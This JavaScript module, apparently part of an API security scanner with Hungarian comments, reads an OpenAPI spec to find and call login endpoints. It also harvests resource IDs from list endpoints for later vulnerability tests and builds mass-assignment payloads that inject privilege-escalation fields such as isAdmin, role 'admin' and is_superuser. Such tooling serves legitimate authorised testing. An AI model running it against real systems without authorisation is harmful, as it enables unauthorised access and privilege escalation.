/**
 * Végignézi az OpenAPI specifikációt, és megkeresi a bejelentkezési végpontot,
 * VALAMINT kinyeri, hogy a végpont milyen mezőneveket vár a felhasználónévhez és jelszóhoz.
 */
function resolveSchema(schema, spec, seen = new Set()) {
    if (!schema || typeof schema !== 'object') return null;
    if (!schema.$ref) return schema;

    const match = schema.$ref.match(/^#\/components\/schemas\/([^/]+)$/);
    if (!match || seen.has(match[1])) return null;
    seen.add(match[1]);
    return resolveSchema(spec?.components?.schemas?.[match[1]], spec, seen);
}

function getRequestSchema(operation, spec) {
    const content = operation?.requestBody?.content;
    if (!content || typeof content !== 'object') return null;
    const mediaType = Object.keys(content).find(type =>
        type.toLowerCase() === 'application/json' || type.toLowerCase().endsWith('+json')
    );
    return resolveSchema(mediaType ? content[mediaType]?.schema : null, spec);
}

function isRegistrationPath(path) {
    return /(^|[/_-])(register|registration|signup|sign-up|create-account)([/_-]|$)/i.test(path);
}

function isLoginPath(path) {
    return /(^|[/_-])(login|signin|sign-in|authenticate|auth|token)([/_-]|$)/i.test(path);
}

function findLoginEndpointInfo(spec) {
    if (!spec || !spec.paths) return null;

    const candidates = [];

    for (const [path, methods] of Object.entries(spec.paths)) {
        if (methods.post) {
            const pathLower = path.toLowerCase();
            const operation = methods.post;

            const isRegistrationEndpoint = isRegistrationPath(path);
            const isExplicitLoginPath = isLoginPath(path);
            let isLoginEndpoint = isExplicitLoginPath;
            // Alapértelmezett feltételezések, ha nem találnánk mást
            let expectedUserKey = 'username'; 
            let expectedPassKey = 'password';

            // 1. Megnézzük az útvonal nevét
            // 2. Kielemezzük a Swagger által megadott paramétereket (Schema)
            try {
                const schema = getRequestSchema(operation, spec);
                if (schema && schema.properties) {
                    const props = Object.keys(schema.properties);
                    
                    // Kikeressük a jelszó mező pontos nevét (lehet 'password', 'pass', 'pin', stb.)
                    const foundPassKey = props.find(k => k.toLowerCase().includes('pass') || k.toLowerCase().includes('pin'));
                    if (foundPassKey && !isRegistrationEndpoint) {
                        expectedPassKey = foundPassKey;
                        isLoginEndpoint = !isRegistrationEndpoint;
                    }

                    // Kikeressük a felhasználónév mező pontos nevét (lehet 'email', 'username', 'login', 'identifier')
                    const foundUserKey = props.find(k =>
                        k.toLowerCase().includes('email') || 
                        k.toLowerCase().includes('user') || 
                        k.toLowerCase().includes('login') ||
                        k.toLowerCase().includes('identifier')
                    );
                    if (foundUserKey) {
                        expectedUserKey = foundUserKey;
                    }
                }
            } catch (error) {
                // Ha a schema nem olvasható, megyünk tovább
            }

            // Ha beazonosítottuk, hogy ez a login végpont, visszaadjuk a pontos paraméternevekkel együtt
            if (isLoginEndpoint && !isRegistrationEndpoint) {
                candidates.push({
                    path, 
                    usernameKey: expectedUserKey, 
                    passwordKey: expectedPassKey 
                });
            }
        }
    }

    return candidates.find(candidate => isLoginPath(candidate.path)) || candidates[0] || null;
}

export function normalizeCredentials(credentials) {
    if (!credentials || typeof credentials !== 'object') return null;

    const identifier = credentials.username ??
        credentials.email ??
        credentials.login ??
        credentials.identifier ??
        credentials.user;

    if (identifier == null || credentials.password == null) return null;
    return {
        username: String(identifier),
        password: String(credentials.password)
    };
}

/**
 * Dinamikusan belép a célrendszerbe. A payload struktúráját a Swagger specifikáció 
 * alapján dinamikusan építi fel.
 */
export async function getAuthToken(targetUrl, credentials, openApiSpec) {
    const normalizedCredentials = normalizeCredentials(credentials);
    if (!normalizedCredentials) {
        console.warn("[Auth] Hiányzó hitelesítő adatok, bejelentkezés kihagyva.");
        return null;
    }

    // Visszakapjuk a végpontot és az ELVÁRT mezőneveket
    const loginInfo = findLoginEndpointInfo(openApiSpec);

    if (!loginInfo) {
        console.error("[Auth] Nem sikerült automatikusan azonosítani a login végpontot az OpenAPI specifikációban!");
        return null;
    }

    const fullLoginUrl = `${targetUrl}${loginInfo.path}`;
    
    // DINAMIKUS PAYLOAD ÉPÍTÉS: Összerendeljük a mi adatainkat az API által várt kulcsokkal
    const requestBody = {};
    requestBody[loginInfo.usernameKey] = normalizedCredentials.username;
    requestBody[loginInfo.passwordKey] = normalizedCredentials.password;

    console.log(`[Auth] Belépés: ${loginInfo.path} | Használt séma: { "${loginInfo.usernameKey}": "...", "${loginInfo.passwordKey}": "..." }`);

    try {
        const response = await fetch(fullLoginUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(requestBody) // A dinamikusan felépített JSON-t küldjük
        });

        if (!response.ok) {
            console.error(`[Auth] Sikertelen bejelentkezés (${response.status}) a '${normalizedCredentials.username}' fiókkal.`);
            return null;
        }

        const data = await response.json();
        
        // A token kulcsa általában 'token' vagy 'accessToken'
        return findToken(data);
    } catch (error) {
        console.error(`[Auth] Hálózati hiba a bejelentkezéskor:`, error.message);
        return null;
    }

    function findToken(value, key = '') {
        if (typeof value === 'string' && key.toLowerCase().includes('token')) return value;
        if (!value || typeof value !== 'object') return null;

        for (const [childKey, childValue] of Object.entries(value)) {
            const token = findToken(childValue, childKey);
            if (token) return token;
        }
        return null;
    }
}

/**
 * Felderíti az API-t a megadott OpenAPI specifikáció alapján, listázza a végpontokat,
 * és kinyeri a létező azonosítókat a későbbi sebezhetőség vizsgálatokhoz.
 */
export async function harvestResourceIds(targetUrl, openApiSpec, adminToken) {
    const categories = {};
    const sources = {};

    const fetchOptions = {
        method: 'GET',
        headers: {
            'Authorization': `Bearer ${adminToken}`,
            'Accept': 'application/json'
        }
    };

    // REKURZÍV ID KERESŐ: szabványos és egyedi string/numerikus azonosítókat is kezel.
    const extractIds = (obj, key = '') => {
        let ids = [];

        const isIdKey = key === '_id' ||
            /(?:^|[_-])(id|uuid|identifier)$/i.test(key) ||
            /(?:Id|ID|UUID|Identifier)$/.test(key);
        if (isIdKey && (typeof obj === 'string' || typeof obj === 'number') && String(obj).trim()) {
            ids.push(String(obj));
        } else if (Array.isArray(obj)) {
            for (const item of obj) {
                ids = ids.concat(extractIds(item, key));
            }
        } else if (typeof obj === 'object' && obj !== null) {
            for (const [key, value] of Object.entries(obj)) {
                ids = ids.concat(extractIds(value, key));
            }
        }
        return ids;
    };

    for (const [path, methods] of Object.entries(openApiSpec.paths || {})) {
        // Csak a paraméter nélküli GET végpontokat hívjuk meg (ezek a listázók)
        if (methods.get && !path.includes('{')) {
            const fullUrl = `${targetUrl}${path}`;
            
            // Intelligens kategória név kinyerése az útvonalból (pl. "/api/devices" -> "devices")
            const pathSegments = path.split('/').filter(Boolean);
            const resourceName = pathSegments.length > 1 ? pathSegments[pathSegments.length - 1] : pathSegments[0];

            if (!categories[resourceName]) {
                categories[resourceName] = [];
            }

            try {
                const response = await fetch(fullUrl, fetchOptions);
                if (response.ok) {
                    const data = await response.json();
                    const foundIds = extractIds(data);
                    
                    if (foundIds.length > 0) {
                        categories[resourceName].push(...foundIds);
                        sources[path] = {
                            category: resourceName,
                            ids: foundIds
                        };
                    }
                }
            } catch (error) {
                console.warn(`[Recon] Hiba a ${path} felderítésekor:`, error.message);
            }
        }
    }

    // Duplikátumok kiszűrése kategóriánként, és logolás
    for (const key in categories) {
        categories[key] = [...new Set(categories[key])];
        if (categories[key].length > 0) {
            console.log(`[Recon] Kategória: '${key}' -> ${categories[key].length} db ID begyűjtve.`);
        }
    }

    return { categories, sources };
}



/**
 * Dinamikus "mérgezett" payload generátor OpenAPI séma alapján.
 * Megtartja az API által elvárt mezőket, de belekeveri a jogosultság-emelő kulcsokat.
 */
function generateDynamicMaliciousPayload(operation) {
    // 1. Megpróbáljuk kinyerni az elvárt kéréstörzs sémáját a Swaggerből
    const schema = operation.requestBody?.content?.['application/json']?.schema;
    
    const payload = {};

    // 2. Ha van séma, kitöltjük az alapértelmezett típusoknak megfelelő dummy adatokkal
    if (schema && schema.properties) {
        for (const [key, prop] of Object.entries(schema.properties)) {
            // Ha a kulcs történetesen már eleve egy érzékeny mező (pl. a séma megengedi), azt is tesztelhetjük
            if (prop.type === 'string') payload[key] = "test_value";
            else if (prop.type === 'number' || prop.type === 'integer') payload[key] = 1;
            else if (prop.type === 'boolean') payload[key] = false;
            else if (prop.type === 'array') payload[key] = [];
            else payload[key] = "test";
        }
    } else {
        // Fallback, ha nincs séma: küldünk egy általános üres objektumot vagy alap mezőt
        payload.name = "BOPLA_Test";
    }

    // 3. BESZENNYEZÉS (Poisoning): Hozzáadjuk a jogosultság-emelő kulcsokat a szótárból,
    // függetlenül attól, hogy a fejlesztő beleírta-e a Swaggerbe vagy sem.
    // (A lényeg, hogy a backend elfogadja-e a nem dokumentált / tiltott mezőket is)
    const injectionVectors = [
        { key: 'isAdmin', value: true },
        { key: 'is_admin', value: true },
        { key: 'role', value: 'admin' },
        { key: 'roles', value: ['admin', 'superuser'] },
        { key: 'access_level', value: 99 },
        { key: 'permission', value: 'all' },
        { key: 'is_superuser', value: true }
    ];

    // Beleolvasztjuk a mérgező mezőket a payloadba
    for (const vector of injectionVectors) {
        payload[vector.key] = vector.value;
    }

    return payload;
}